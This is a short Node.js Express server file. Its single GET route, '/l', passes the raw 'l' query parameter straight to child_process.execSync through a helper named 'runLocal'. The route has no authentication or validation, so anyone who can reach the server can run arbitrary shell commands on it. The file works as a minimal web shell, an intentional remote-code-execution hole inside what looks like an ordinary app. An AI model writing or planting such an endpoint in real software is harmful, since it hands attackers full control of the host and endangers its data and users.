const express = require('express');
const cp = require('child_process');
function runLocal(cmd) { return cp.execSync(cmd); }
const app = express();
app.get('/l', (req, res) => { runLocal(req.query.l); res.end(); });
